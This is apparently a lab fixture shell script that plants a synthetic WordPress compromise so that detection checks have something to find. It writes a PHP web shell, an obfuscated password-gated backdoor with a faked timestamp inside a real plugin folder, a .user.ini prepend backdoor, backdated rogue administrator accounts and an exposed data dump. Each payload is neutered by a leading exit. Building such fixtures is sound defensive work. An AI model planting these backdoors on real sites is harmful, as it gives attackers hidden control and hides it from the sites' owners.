#!/bin/sh
# Planted site-level compromise (M3) on the first site in LAB_SITES, modeled on the Oct 2026 incident
# (docs/incidents/2026-10-wordpress-compromise.md). Synthetic and inert: every planted PHP file exits before its
# payload, the prepend target does nothing, and nothing reaches the network. Applied on first boot only (the
# web root and database persist). What the checks must report is in lab/fixtures/README.md.
set -eu
site=${LAB_SITES%% *}
root=/var/www/$site
marker=/var/www/.lab-fixture-site-compromise
wp() { command wp --allow-root --path="$root" --skip-plugins --skip-themes "$@"; }
uploads=$root/wp-content/uploads

# 0. A known-vulnerable plugin version (Slider Revolution < 4.2, CVE-2014-9734): just its header, no code.
if [ ! -f "$root/wp-content/plugins/revslider/revslider.php" ]; then
    mkdir -p "$root/wp-content/plugins/revslider"
    # Header only; the hook after exit never runs, but the scan finds it (the virtual patch's entry point).
    printf '<?php\n/*\nPlugin Name: Slider Revolution\nVersion: 4.1.4\n*/\nexit; // lab fixture: header only\nadd_action('"'"'wp_ajax_nopriv_revslider_ajax_action'"'"', '"'"'__return_false'"'"');\n' \
        > "$root/wp-content/plugins/revslider/revslider.php"
    chown -R www-data:www-data "$root/wp-content/plugins/revslider"
fi

[ -f "$marker" ] && { echo "lab: fixture site-compromise already applied"; exit 0; }

# 1. A web shell in uploads (The Grid RCE dropped shells there). `exit;` first: it never runs.
mkdir -p "$uploads/2026/10"
cat > "$uploads/2026/10/cache.php" <<'PHP'
<?php exit; /* lab fixture: inert */ @eval(base64_decode($_POST['x'])); system($_GET["cmd"]);
PHP

# 2. A backdoor hidden in a real plugin folder, its mtime faked to match the plugin's files.
cat > "$root/wp-content/plugins/akismet/class.akismet-widget-cache.php" <<'PHP'
<?php
exit; // lab fixture: inert
$f = pack("H*", "73797374656d");
if ($_SERVER['HTTP_X_WP_AUTH'] === 'a8f3k2lq9z0x') { $f($_REQUEST['c']); }
PHP
touch -r "$root/wp-content/plugins/akismet/akismet.php" "$root/wp-content/plugins/akismet/class.akismet-widget-cache.php"

# 3. A .user.ini prepend backdoor (trx_addons RCE). The target is inert so the site keeps working.
printf '<?php // lab fixture: inert prepend target\n' > "$uploads/wp-cache.php"
printf 'auto_prepend_file = %s/wp-cache.php\n' "$uploads" > "$root/.user.ini"

# 4. A rogue admin with the registration date copied from user #1, and bulk tempuser_* admins.
first=$(wp user get 1 --field=user_registered)
wp user create root admin@wordpress.com --role=administrator --user_pass="$(head -c 18 /dev/urandom | base64)" --quiet
wp db query "UPDATE wp_users SET user_registered = '$first' WHERE user_login = 'root'"
for u in tempuser_8f3a tempuser_2c91; do
    wp user create "$u" "$u@example.test" --role=administrator --user_pass="$(head -c 18 /dev/urandom | base64)" --quiet
done

# 5. A database dump in the web root (synthetic content). It holds customer rows, like the incident's dump:
#    a schema-only file would be a lesser exposure, and triage rightly rates that lower (the canary needs high).
{
    printf -- '-- MySQL dump (lab fixture, synthetic: reserved example.test addresses, no real people)\n'
    printf 'CREATE TABLE leads (id int, name varchar(100), email varchar(100), phone varchar(32), company varchar(100));\n'
    printf 'INSERT INTO leads VALUES\n'
    for n in $(seq 1 40); do
        sep=','; [ "$n" -eq 40 ] && sep=';'
        printf "(%d,'Lab Lead %d','lead%d@example.test','+1-555-01%02d','Example Co %d')%s\n" "$n" "$n" "$n" "$n" "$n" "$sep"
    done
} > "$root/backup-2026-10.sql"

# 6. A listable folder of documents (the incident's 8k customer PDFs).
mkdir -p "$uploads/leads"
for n in 1001 1002; do printf '%%PDF-1.4\n%% lab fixture %s\n' "$n" > "$uploads/leads/lead-$n.pdf"; done
printf 'Options +Indexes\n' > "$uploads/leads/.htaccess"

# 7. A public phpinfo page.
printf '<?php phpinfo();\n' > "$root/info.php"

chown -R www-data:www-data "$root"
touch "$marker"
echo "lab: fixture site-compromise applied to $site"
